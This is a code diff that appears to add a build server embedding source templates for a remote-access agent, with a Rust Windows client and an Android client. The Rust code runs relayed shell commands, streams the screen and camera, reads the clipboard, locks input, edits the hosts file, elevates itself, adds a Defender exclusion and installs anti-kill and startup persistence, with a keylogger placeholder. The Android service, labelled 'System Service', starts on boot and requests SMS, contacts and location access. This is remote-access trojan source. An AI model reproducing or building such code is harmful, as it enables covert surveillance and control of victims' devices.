+            let entry = payload.get("entry").and_then(|v| v.as_str()).unwrap_or("");
+            if entry.is_empty() { Err("missing entry".into()) }
+            else {
+                #[cfg(windows)]
+                {
+                    powershell(&format!(r#"Add-Content 'C:\\Windows\\System32\\drivers\\etc\\hosts' '{}'"#, ps_escape(entry))).map(|_| json!({ "ok": true }))
+                }
+                #[cfg(not(windows))]
+                { Err("not supported".into()) }
+            }
+        }
+
+        // ─── Scheduled tasks ───
+        "tasks.list" => {
+            #[cfg(windows)]
+            {
+                match powershell("Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } | Select-Object TaskName,TaskPath,State | ConvertTo-Json -Compress") {
+                    Ok(s) => Ok(json!({ "ok": true, "tasks": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "tasks.run" => {
+            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
+            if name.is_empty() { Err("missing name".into()) }
+            else {
+                match powershell(&format!("Start-ScheduledTask -TaskName '{}'", ps_escape(name))) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+
+        // ─── Keylogger ───
+        "keylog.start" => {
+            log!("keylog.start — placeholder, requires low-level hook");
+            Ok(json!({ "ok": true, "status": "keylogger not yet implemented (requires SetWindowsHookEx)" }))
+        }
+        "keylog.stop" => {
+            Ok(json!({ "ok": true }))
+        }
+
+        // ─── Screen record ───
+        "screen.record.start" => {
+            let duration = payload.get("duration").and_then(|v| v.as_u64()).unwrap_or(10);
+            let path = format!("{}\\\\screen_recording.mp4", std::env::temp_dir().display());
+            match powershell(&format!("Start-Process -FilePath ffmpeg -ArgumentList '-f gdigrab -framerate 15 -t {} -i desktop -y {}' -NoNewWindow -PassThru", duration, ps_escape(&path))) {
+                Ok(_) => Ok(json!({ "ok": true, "path": path, "duration": duration })),
+                Err(e) => Err(e),
+            }
+        }
+
+        a if a.starts_with("system.") => system_action(a, &payload),
+        a if a.starts_with("fun.") => fun_action(a, &payload),
+        _ => Err(format!("unknown action: {}", action)),
+    };
+
+    match &result {
+        Ok(v)  => send_result(cfg, &id, true, v.clone(), None),
+        Err(e) => send_result(cfg, &id, false, Value::Null, Some(e.clone())),
+    }
+
+    (action, result)
+}
+
+// ---------- HidenHost relay handler ----------
+
+fn handle_relay_command(
+    cfg: &Config,
+    streaming: &Arc<AtomicBool>,
+    cam_streaming: &Arc<AtomicBool>,
+    stream_cfg: &Arc<Mutex<StreamConfig>>,
+    relay_tx: &tokio::sync::mpsc::Sender<signaling::Signal>,
+    msg: &Value,
+) {
+    let msg_type = msg.get("type").and_then(|v| v.as_str()).unwrap_or("");
+    let payload = msg.get("payload").cloned().unwrap_or(Value::Null);
+
+    match msg_type {
+        "cmd" => {
+            let action = payload.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            log!("relay cmd: {}", action);
+
+            match action.as_str() {
+                "screen.stream.start" => {
+                    let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
+                    let f = payload.get("fps").and_then(|v| v.as_u64()).unwrap_or(30) as u32;
+                    if let Ok(mut sc) = stream_cfg.lock() {
+                        sc.quality = q;
+                        sc.fps_cap = f.clamp(1, 60);
+                    }
+                    streaming.store(true, Ordering::SeqCst);
+                }
+                "screen.stream.stop" => {
+                    streaming.store(false, Ordering::SeqCst);
+                }
+                "camera.stream.start" => {
+                    cam_streaming.store(true, Ordering::SeqCst);
+                }
+                "camera.stream.stop" => {
+                    cam_streaming.store(false, Ordering::SeqCst);
+                }
+                "screen.capture" => {
+                    let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
+                    if let Ok((jpg, _w, _h)) = capture_jpeg(q) {
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
+                        let _ = relay_tx.try_send(signaling::Signal {
+                            event: "screen-frame".to_string(),
+                            payload: json!({ "jpeg_b64": b64 }),
+                        });
+                    }
+                }
+                "camera.capture" => {
+                    let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(65) as u8;
+                    if let Ok(jpg) = capture_camera_jpeg(q) {
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
+                        let _ = relay_tx.try_send(signaling::Signal {
+                            event: "camera-frame".to_string(),
+                            payload: json!({ "camera_b64": b64 }),
+                        });
+                    }
+                }
+                "shell.exec" => {
+                    let c = payload.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
+                    if !c.is_empty() {
+                        let result = run_shell(c);
+                        let _ = relay_tx.try_send(signaling::Signal {
+                            event: "result".to_string(),
+                            payload: json!({ "action": "shell.exec", "ok": true, "result": result }),
+                        });
+                    }
+                }
+                "clipboard.get" => {
+                    match clipboard_get() {
+                        Ok(v) => {
+                            let _ = relay_tx.try_send(signaling::Signal {
+                                event: "result".to_string(),
+                                payload: json!({ "action": "clipboard.get", "ok": true, "result": v }),
+                            });
+                        }
+                        Err(e) => {
+                            let _ = relay_tx.try_send(signaling::Signal {
+                                event: "result".to_string(),
+                                payload: json!({ "action": "clipboard.get", "ok": false, "error": e }),
+                            });
+                        }
+                    }
+                }
+                "clipboard.set" => {
+                    let text = payload.get("text").and_then(|v| v.as_str()).unwrap_or("");
+                    let _ = clipboard_set(text);
+                }
+                "input.mouse" => {
+                    let event = payload.get("event").and_then(|v| v.as_str()).unwrap_or("");
+                    let _ = mouse_action(event, &payload);
+                }
+                "input.key" => {
+                    let _ = key_action(&payload);
+                }
+                "input.lock" => {
+                    let locked = payload.get("locked").and_then(|v| v.as_bool()).unwrap_or(false);
+                    let _ = input_lock(locked);
+                }
+                "overlay.draw" | "overlay.clear" => {
+                    // Client-side only
+                }
+                _ => {
+                    let cmd = json!({
+                        "id": "",
+                        "action": action,
+                        "payload": payload,
+                    });
+                    handle_command(cfg, streaming, cam_streaming, stream_cfg, &cmd);
+                }
+            }
+        }
+        _ => {}
+    }
+}
+
+// ---------- main ----------
+
+fn main() {
+    // If marked as require_admin and we're not elevated, relaunch elevated via PowerShell.
+    #[cfg(windows)]
+    {
+        if binding::REQUIRE_ADMIN && !is_elevated() {
+            if relaunch_elevated() {
+                std::process::exit(0);
+            }
+        }
+        if binding::WD_EXCLUSION {
+            let _ = add_defender_exclusion();
+        }
+    }
+
+    let args: Vec<String> = std::env::args().collect();
+    let server_override = std::env::var("SENTINEL_SERVER_URL").ok()
+        .or_else(|| args.iter().position(|a| a == "--server").and_then(|i| args.get(i + 1).cloned()));
+
+    // Preferred path: identity is baked into the binary at build time, so
+    // every EXE connects standalone with no config file on disk.
+    let server = server_override.unwrap_or_else(|| DEFAULT_SERVER.to_string());
+    let cfg = if !binding::BIND_DEVICE_ID.is_empty() && !binding::BIND_DEVICE_TOKEN.is_empty() {
+        log!("using baked identity for device {}", binding::BIND_DEVICE_ID);
+        Config {
+            server,
+            device_id: binding::BIND_DEVICE_ID.to_string(),
+            device_token: binding::BIND_DEVICE_TOKEN.to_string(),
+        }
+    } else {
+        log!("no baked identity — auto-registering at {}", server);
+        loop {
+            match auto_register(&server) {
+                Ok(c) => { log!("registered as {}", c.device_id); break c; }
+                Err(e) => { log!("register failed: {} — retry in 10s", e); thread::sleep(Duration::from_secs(10)); }
+            }
+        }
+    };
+
+    let _ = STARTED.elapsed();
+
+    if binding::ANTIKILL { let _ = install_antikill(); }
+    if STARTUP_FLAG { let _ = install_startup(); }
+
+    let cfg = Arc::new(cfg);
+    let streaming = Arc::new(AtomicBool::new(false));
+    let cam_streaming = Arc::new(AtomicBool::new(false));
+    let stream_cfg = Arc::new(Mutex::new(StreamConfig::default()));
+
+    // Heartbeat thread (every 5s)
+    {
+        let cfg = cfg.clone();
+        thread::spawn(move || loop {
+            heartbeat(&cfg);
+            thread::sleep(Duration::from_secs(5));
+        });
+    }
+
+    // HidenHost relay thread
+    let relay_tx_shared: Arc<Mutex<Option<tokio::sync::mpsc::Sender<signaling::Signal>>>> = Arc::new(Mutex::new(None));
+    {
+        let cfg = cfg.clone();
+        let streaming = streaming.clone();
+        let cam_streaming = cam_streaming.clone();
+        let stream_cfg = stream_cfg.clone();
+        let relay_tx_shared = relay_tx_shared.clone();
+        thread::spawn(move || {
+            let rt = tokio::runtime::Builder::new_current_thread()
+                .enable_all()
+                .build()
+                .expect("relay runtime");
+            rt.block_on(async {
+                loop {
+                    log!("connecting to HidenHost relay…");
+                    match hiden::spawn(cfg.device_id.clone()).await {
+                        Ok((tx, mut rx)) => {
+                            log!("HidenHost relay connected");
+                            {
+                                let mut guard = relay_tx_shared.lock().unwrap();
+                                *guard = Some(tx.clone());
+                            }
+
+                            while let Some(sig) = rx.recv().await {
+                                let msg = json!({
+                                    "type": sig.event,
+                                    "payload": sig.payload,
+                                });
+                                handle_relay_command(&cfg, &streaming, &cam_streaming, &stream_cfg, &tx, &msg);
+                            }
+
+                            log!("HidenHost relay disconnected");
+                            {
+                                let mut guard = relay_tx_shared.lock().unwrap();
+                                *guard = None;
+                            }
+                        }
+                        Err(e) => {
+                            log!("HidenHost relay connect error: {}", e);
+                        }
+                    }
+                    tokio::time::sleep(Duration::from_secs(3)).await;
+                }
+            });
+        });
+    }
+
+    // Screen-stream thread — reads quality/fps from stream_cfg
+    {
+        let cfg = cfg.clone();
+        let streaming = streaming.clone();
+        let stream_cfg = stream_cfg.clone();
+        let relay_tx_shared = relay_tx_shared.clone();
+        thread::spawn(move || {
+            loop {
+                if streaming.load(Ordering::SeqCst) {
+                    let (q, interval_ms) = {
+                        let sc = stream_cfg.lock().unwrap();
+                        (sc.quality, (1000u64).checked_div(sc.fps_cap as u64).unwrap_or(33))
+                    };
+                    let res = capture_jpeg(q).and_then(|(jpg, _w, _h)| {
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
+
+                        let sent_via_relay = {
+                            if let Ok(guard) = relay_tx_shared.lock() {
+                                if let Some(tx) = guard.as_ref() {
+                                    tx.try_send(signaling::Signal {
+                                        event: "frame".to_string(),
+                                        payload: json!({ "jpeg_b64": b64 }),
+                                    }).is_ok()
+                                } else { false }
+                            } else { false }
+                        };
+
+                        if !sent_via_relay {
+                            push_screen(&cfg, &b64)?;
+                        }
+                        Ok(())
+                    });
+                    if let Err(e) = res {
+                        log!("stream err: {}", e);
+                        thread::sleep(Duration::from_secs(2));
+                    } else {
+                        thread::sleep(Duration::from_millis(interval_ms.max(16)));
+                    }
+                } else {
+                    thread::sleep(Duration::from_millis(800));
+                }
+            }
+        });
+    }
+
+    // Camera-stream thread
+    {
+        let cfg = cfg.clone();
+        let cam_streaming = cam_streaming.clone();
+        let relay_tx_shared = relay_tx_shared.clone();
+        thread::spawn(move || {
+            loop {
+                if cam_streaming.load(Ordering::SeqCst) {
+                    let res = capture_camera_jpeg(65).and_then(|jpg| {
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
+
+                        let sent_via_relay = {
+                            if let Ok(guard) = relay_tx_shared.lock() {
+                                if let Some(tx) = guard.as_ref() {
+                                    tx.try_send(signaling::Signal {
+                                        event: "camera-frame".to_string(),
+                                        payload: json!({ "camera_b64": b64 }),
+                                    }).is_ok()
+                                } else { false }
+                            } else { false }
+                        };
+
+                        if !sent_via_relay {
+                            push_camera(&cfg, &b64)?;
+                        }
+                        Ok(())
+                    });
+                    if let Err(e) = res {
+                        log!("cam err: {}", e);
+                        thread::sleep(Duration::from_secs(3));
+                    } else {
+                        thread::sleep(Duration::from_millis(250));
+                    }
+                } else {
+                    thread::sleep(Duration::from_millis(800));
+                }
+            }
+        });
+    }
+
+    // Main poll loop
+    loop {
+        let cmds = poll(&cfg);
+        for c in cmds {
+            let cfg = cfg.clone();
+            let streaming = streaming.clone();
+            let cam_streaming = cam_streaming.clone();
+            let stream_cfg = stream_cfg.clone();
+            thread::spawn(move || {
+                let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                    handle_command(&cfg, &streaming, &cam_streaming, &stream_cfg, &c);
+                }));
+            });
+        }
+        thread::sleep(Duration::from_millis(1000));
+    }
+}
+`
+
+const signalingRs = `// Supabase Realtime (phoenix) signaling client for WebRTC offer/answer/ICE.
+
+use anyhow::{anyhow, Result};
+use futures_util::{SinkExt, StreamExt};
+use serde_json::{json, Value};
+use std::time::Duration;
+use tokio::{
+    sync::mpsc::{Receiver, Sender},
+    time,
+};
+use tokio_tungstenite::{
+    connect_async,
+    tungstenite::{client::IntoClientRequest, Message},
+};
+
+use crate::binding::{SUPABASE_ANON_KEY, SUPABASE_URL};
+
+pub struct Signal {
+    pub event: String,
+    pub payload: Value,
+}
+
+pub async fn spawn(device_id: String) -> Result<(Sender<Signal>, Receiver<Signal>)> {
+    let host = SUPABASE_URL
+        .trim_start_matches("https://")
+        .trim_start_matches("http://")
+        .trim_end_matches('/');
+    let url = format!(
+        "wss://{}/realtime/v1/websocket?apikey={}&vsn=1.0.0",
+        host, SUPABASE_ANON_KEY
+    );
+    let req = url.as_str().into_client_request()?;
+    let (ws, _resp) = connect_async(req).await?;
+    let (mut write, mut read) = ws.split();
+
+    let topic = format!("realtime:webrtc:{}", device_id);
+
+    let join = json!({
+        "topic": topic,
+        "event": "phx_join",
+        "payload": {
+            "config": {
+                "broadcast": { "self": false, "ack": false },
+                "presence": { "key": "" }
+            }
+        },
+        "ref": "1",
+        "join_ref": "1"
+    });
+    write.send(Message::Text(join.to_string())).await?;
+
+    let (out_tx, mut out_rx) = tokio::sync::mpsc::channel::<Signal>(32);
+    let (in_tx, in_rx) = tokio::sync::mpsc::channel::<Signal>(32);
+
+    let topic_w = topic.clone();
+    tokio::spawn(async move {
+        let mut ref_id: u64 = 2;
+        let mut hb = time::interval(Duration::from_secs(25));
+        hb.tick().await;
+        loop {
+            tokio::select! {
+                msg = out_rx.recv() => {
+                    let Some(sig) = msg else { break; };
+                    let frame = json!({
+                        "topic": topic_w,
+                        "event": "broadcast",
+                        "payload": {
+                            "type": "broadcast",
+                            "event": sig.event,
+                            "payload": sig.payload,
+                        },
+                        "ref": ref_id.to_string(),
+                        "join_ref": "1",
+                    });
+                    ref_id += 1;
+                    if write.send(Message::Text(frame.to_string())).await.is_err() {
+                        break;
+                    }
+                }
+                _ = hb.tick() => {
+                    let frame = json!({
+                        "topic": "phoenix",
+                        "event": "heartbeat",
+                        "payload": {},
+                        "ref": ref_id.to_string(),
+                    });
+                    ref_id += 1;
+                    if write.send(Message::Text(frame.to_string())).await.is_err() {
+                        break;
+                    }
+                }
+            }
+        }
+        let _ = write.close().await;
+    });
+
+    tokio::spawn(async move {
+        while let Some(msg) = read.next().await {
+            let Ok(msg) = msg else { break; };
+            let text = match msg {
+                Message::Text(t) => t,
+                Message::Binary(b) => match String::from_utf8(b) {
+                    Ok(s) => s,
+                    Err(_) => continue,
+                },
+                Message::Close(_) => break,
+                _ => continue,
+            };
+            let Ok(v): Result<Value, _> = serde_json::from_str(&text) else { continue };
+            if v.get("event").and_then(|e| e.as_str()) != Some("broadcast") {
+                continue;
+            }
+            let payload = match v.get("payload") {
+                Some(p) => p,
+                None => continue,
+            };
+            let event = payload.get("event").and_then(|e| e.as_str()).unwrap_or("");
+            let inner = payload.get("payload").cloned().unwrap_or(Value::Null);
+            if event == "answer" || event == "ice" {
+                let _ = in_tx
+                    .send(Signal {
+                        event: event.to_string(),
+                        payload: inner,
+                    })
+                    .await;
+            }
+        }
+    });
+
+    let _ = device_id;
+    Ok((out_tx, in_rx))
+}
+
+#[allow(dead_code)]
+fn _silence_anyhow_warning() {
+    let _: anyhow::Error = anyhow!("placeholder");
+}
+`
+
+const webrtcRs = `// WebRTC placeholder — real WebRTC peer connections are not used.
+// Screen/camera streaming goes through HidenHost relay (WSS) or HTTP polling.
+// This module provides stub functions so the rest of main.rs compiles.
+
+use serde_json::Value;
+
+pub fn start_session(
+    _device_id: &str,
+    _device_token: &str,
+    _session_id: &str,
+    _ice_servers: &Value,
+) -> Result<(), String> {
+    Err("WebRTC not compiled in — use relay streaming instead".into())
+}
+
+pub fn stop_session(_session_id: &str) {}
+`
+
+const hidenRs = `// HidenHost relay client.
+
+use anyhow::Result;
+use futures_util::{SinkExt, StreamExt};
+use serde_json::{json, Value};
+use std::time::Duration;
+use tokio::{
+    sync::mpsc::{Receiver, Sender},
+    time,
+};
+use tokio_tungstenite::{
+    connect_async,
+    tungstenite::{client::IntoClientRequest, Message},
+};
+
+use crate::binding::{HIDEN_AUTH_KEY, HIDEN_WS_URL};
+use crate::signaling::Signal;
+
+pub async fn spawn(device_id: String) -> Result<(Sender<Signal>, Receiver<Signal>)> {
+    let url = format!(
+        "{}/?key={}&role=agent&device={}",
+        HIDEN_WS_URL,
+        urlencode(HIDEN_AUTH_KEY),
+        urlencode(&device_id),
+    );
+    let req = url.as_str().into_client_request()?;
+    let (ws, _resp) = connect_async(req).await?;
+    let (mut write, mut read) = ws.split();
+
+    let hello = json!({
+        "type": "hello",
+        "role": "agent",
+        "deviceId": device_id,
+    });
+    write.send(Message::Text(hello.to_string())).await?;
+
+    let (out_tx, mut out_rx) = tokio::sync::mpsc::channel::<Signal>(64);
+    let (in_tx, in_rx) = tokio::sync::mpsc::channel::<Signal>(64);
+
+    tokio::spawn(async move {
+        let mut hb = time::interval(Duration::from_secs(25));
+        hb.tick().await;
+        loop {
+            tokio::select! {
+                msg = out_rx.recv() => {
+                    let Some(sig) = msg else { break; };
+                    let frame = json!({
+                        "type": sig.event,
+                        "payload": sig.payload,
+                    });
+                    if write.send(Message::Text(frame.to_string())).await.is_err() {
+                        break;
+                    }
+                }
+                _ = hb.tick() => {
+                    if write.send(Message::Ping(Vec::new())).await.is_err() {
+                        break;
+                    }
+                }
+            }
+        }
+        let _ = write.close().await;
+    });
+
+    tokio::spawn(async move {
+        while let Some(msg) = read.next().await {
+            let Ok(msg) = msg else { break; };
+            let text = match msg {
+                Message::Text(t) => t,
+                Message::Binary(b) => match String::from_utf8(b) {
+                    Ok(s) => s,
+                    Err(_) => continue,
+                },
+                Message::Close(_) => break,
+                _ => continue,
+            };
+            let Ok(v): Result<Value, _> = serde_json::from_str(&text) else { continue };
+            let event = v.get("type").and_then(|e| e.as_str()).unwrap_or("");
+            if event == "welcome" || event == "agent-online" || event == "viewer-joined"
+                || event == "viewer-left" || event == "error"
+            {
+                continue;
+            }
+            let payload = v.get("payload").cloned().unwrap_or(Value::Null);
+            let _ = in_tx
+                .send(Signal {
+                    event: event.to_string(),
+                    payload,
+                })
+                .await;
+        }
+    });
+
+    Ok((out_tx, in_rx))
+}
+
+fn urlencode(s: &str) -> String {
+    s.bytes()
+        .map(|b| match b {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                (b as char).to_string()
+            }
+            _ => format!("%{:02X}", b),
+        })
+        .collect()
+}
+`
+
+const cargoToml = `[package]
+name = "sentinel-agent"
+version = "0.3.0"
+edition = "2021"
+
+[features]
+default = []
+windowed = []
+
+[[bin]]
+name = "{{BUILD_NAME}}"
+path = "src/main.rs"
+
+[dependencies]
+ureq = { version = "2.10", features = ["json"] }
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+base64 = "0.22"
+gethostname = "0.5"
+whoami = "1.5"
+tokio = { version = "1", features = ["rt-multi-thread", "macros", "sync", "time", "net", "io-util"] }
+anyhow = "1"
+futures-util = "0.3"
+tokio-tungstenite = { version = "0.21", features = ["rustls-tls-native-roots"] }
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+strip = true
+panic = "abort"
+`
+
+async function verifyBuildserverKey(request: Request): Promise<boolean> {
+  const key = (
+    request.headers.get('x-buildserver-key')
+    ?? request.headers.get('x-api-key')
+    ?? request.headers.get('authorization')?.replace(/^Bearer\s+/i, '')
+    ?? ''
+  ).trim()
+  if (!key) return false
+  const expected = process.env.BUILDSERVER_KEY?.trim()
+  if (!expected) return false
+  return key === expected
+}
+
+// ── Android stub sources ────────────────────────────────────────────────────
+
+const androidBindingKt = `package com.veltrix.agent
+
+/** Per-build constants — overwritten by the build server before compilation. */
+object Binding {
+    const val OWNER_USER_ID = "{{USER_ID}}"
+    const val SENTINEL_SERVER = "{{API_BASE}}"
+    const val BUILD_NAME = "{{BUILD_NAME}}"
+    const val PLATFORM = "android"
+
+    const val HIDEN_WS_URL = "{{RELAY_URL}}"
+    const val HIDEN_AUTH_KEY = "{{HIDEN_AUTH_KEY}}"
+
+    const val SUPABASE_URL = "{{SUPABASE_URL}}"
+    const val SUPABASE_ANON_KEY = "{{SUPABASE_ANON_KEY}}"
+
+    const val DEBUG = {{DEBUG}}
+    const val STARTUP_ON_BOOT = {{FEATURE_STARTUP}}
+    const val BUILD_TAG = "{{BUILD_TAG}}"
+
+    // Feature flags
+    const val FEAT_SCREEN = {{FEATURE_SCREEN}}
+    const val FEAT_CAMERA = {{FEATURE_CAMERA}}
+    const val FEAT_FILES = {{FEATURE_FILES}}
+    const val FEAT_MIC = {{FEATURE_MIC}}
+    const val FEAT_LOCATION = {{FEATURE_LOCATION}}
+    const val FEAT_SMS = {{FEATURE_SMS}}
+    const val FEAT_CONTACTS = {{FEATURE_CONTACTS}}
+    const val FEAT_NOTIFICATIONS = {{FEATURE_NOTIFICATIONS}}
+    const val FEAT_INPUT = {{FEATURE_INPUT}}
+}
+`
+
+const androidBootReceiverKt = `package com.veltrix.agent
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.os.Build
+
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_BOOT_COMPLETED && Binding.STARTUP_ON_BOOT) {
+            val svc = Intent(context, AgentService::class.java)
+            if (Build.VERSION.SDK_INT >= 26) {
+                context.startForegroundService(svc)
+            } else {
+                context.startService(svc)
+            }
+        }
+    }
+}
+`
+
+const androidMainActivityKt = `package com.veltrix.agent
+
+import android.Manifest
+import android.app.Activity
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
+import android.os.Build
+import android.os.Bundle
+import android.provider.Settings
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+
+class MainActivity : Activity() {
+    private val REQ_PERMS = 100
+    private val REQ_PROJECTION = 101
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        requestAllPermissions()
+    }
+
+    private fun requestAllPermissions() {
+        val perms = mutableListOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+        )
+        if (Build.VERSION.SDK_INT >= 33) {
+            perms.add(Manifest.permission.POST_NOTIFICATIONS)
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
+        } else {
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+        }
+        if (Binding.FEAT_LOCATION) {
+            perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
+            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        }
+        if (Binding.FEAT_SMS) {
+            perms.add(Manifest.permission.READ_SMS)
+            perms.add(Manifest.permission.RECEIVE_SMS)
+        }
+        if (Binding.FEAT_CONTACTS) {
+            perms.add(Manifest.permission.READ_CONTACTS)
+        }
+
+        val needed = perms.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (needed.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_PERMS)
+        } else {
+            requestScreenCapture()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQ_PERMS) {
+            requestScreenCapture()
+        }
+    }
+
+    private fun requestScreenCapture() {
+        if (Binding.FEAT_SCREEN) {
+            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            startActivityForResult(mgr.createScreenCaptureIntent(), REQ_PROJECTION)
+        } else {
+            startAgent(null, 0)
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQ_PROJECTION) {
+            if (resultCode == RESULT_OK && data != null) {
+                startAgent(data, resultCode)
+            } else {
+                startAgent(null, 0)
+            }
+        }
+    }
+
+    private fun startAgent(projectionData: Intent?, resultCode: Int) {
+        val intent = Intent(this, AgentService::class.java)
+        if (projectionData != null) {
+            intent.putExtra("projection_data", projectionData)
+            intent.putExtra("projection_result_code", resultCode)
+        }
+        if (Build.VERSION.SDK_INT >= 26) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+
+        if (Binding.FEAT_INPUT) {
+            try {
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            } catch (_: Exception) {}
+        }
+
+        finish()
+    }
+}
+`
+
+const androidAgentServiceKt = `package com.veltrix.agent
+
+import android.app.*
+import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
+import android.os.*
+import android.util.DisplayMetrics
+import android.util.Log
+import android.view.WindowManager
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.io.File
+import java.util.concurrent.TimeUnit
+
+class AgentService : Service() {
+    companion object {
+        const val TAG = "VeltrixAgent"
+        const val CHANNEL_ID = "agent_fg"
+        const val NOTIF_ID = 1
+    }
+
+    private val http = OkHttpClient.Builder()
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    private var deviceId: String? = null
+    private var deviceToken: String? = null
+    private var ws: WebSocket? = null
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var imageReader: ImageReader? = null
+    private var streaming = false
+    private val handler = Handler(Looper.getMainLooper())
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
+    override fun onCreate() {
+        super.onCreate()
+        createNotificationChannel()
+        val notif = Notification.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Service")
+            .setContentText("Running")
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
+            .build()
+        startForeground(NOTIF_ID, notif)
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val projData = intent?.getParcelableExtra<Intent>("projection_data")
+        val projCode = intent?.getIntExtra("projection_result_code", 0) ?: 0
+
+        if (projData != null && projCode != 0) {
+            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            mediaProjection = mgr.getMediaProjection(projCode, projData)
+        }
+
+        Thread { mainLoop() }.start()
+        return START_STICKY
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= 26) {
+            val ch = NotificationChannel(CHANNEL_ID, "Agent Service", NotificationManager.IMPORTANCE_LOW)
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
+        }
+    }
+
+    private fun mainLoop() {
+        register()
+        connectRelay()
+        while (true) {
+            try { heartbeat() } catch (e: Exception) { log("heartbeat err: \$e") }
+            try { poll() } catch (e: Exception) { log("poll err: \$e") }
+            Thread.sleep(5000)
+        }
+    }
+
+    private fun register() {
+        val prefs = getSharedPreferences("agent", MODE_PRIVATE)
+        deviceId = prefs.getString("device_id", null)
+        deviceToken = prefs.getString("device_token", null)
+        if (deviceId != null && deviceToken != null) {
+            log("already registered: \$deviceId")
+            return
+        }
+
+        val caps = JSONObject().apply {
+            put("screen", Binding.FEAT_SCREEN && mediaProjection != null)
+            put("camera", Binding.FEAT_CAMERA)
+            put("files", Binding.FEAT_FILES)
+            put("mic", Binding.FEAT_MIC)
+            put("location", Binding.FEAT_LOCATION)
+            put("sms", Binding.FEAT_SMS)
+            put("contacts", Binding.FEAT_CONTACTS)
+            put("notifications", Binding.FEAT_NOTIFICATIONS)
+            put("input", Binding.FEAT_INPUT)
+        }
+
+        val body = JSONObject().apply {
+            put("pc_name", Build.MODEL)
+            put("device_name", "\${Build.MANUFACTURER} \${Build.MODEL}")
+            put("os", "Android \${Build.VERSION.RELEASE}")
+            put("username", Build.MODEL)
+            put("bind_user_id", Binding.OWNER_USER_ID)
+            put("tag", Binding.BUILD_TAG)
+            put("platform", "android")
+            put("capabilities", caps)
+        }
+
+        val resp = postJson("/api/public/agent/auto-register", body)
+        if (resp != null) {
+            deviceId = resp.optString("device_id")
+            deviceToken = resp.optString("device_token")
+            prefs.edit()
+                .putString("device_id", deviceId)
+                .putString("device_token", deviceToken)
+                .apply()
+            log("registered: \$deviceId")
+        } else {
+            log("registration failed, retrying in 10s")
+            Thread.sleep(10000)
+            register()
+        }
+    }
+
+    private fun heartbeat() {
+        val body = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_token", deviceToken)
+            put("username", Build.MODEL)
+            put("metrics", JSONObject().apply {
+                put("uptime_seconds", SystemClock.elapsedRealtime() / 1000)
+            })
+        }
+        postJson("/api/public/agent/heartbeat", body)
+    }
+
+    private fun poll() {
+        val body = JSONObject().apply {
+            put("device_id", deviceId)
+            put("device_token", deviceToken)
+        }
+        val resp = postJson("/api/public/agent/poll", body) ?: return
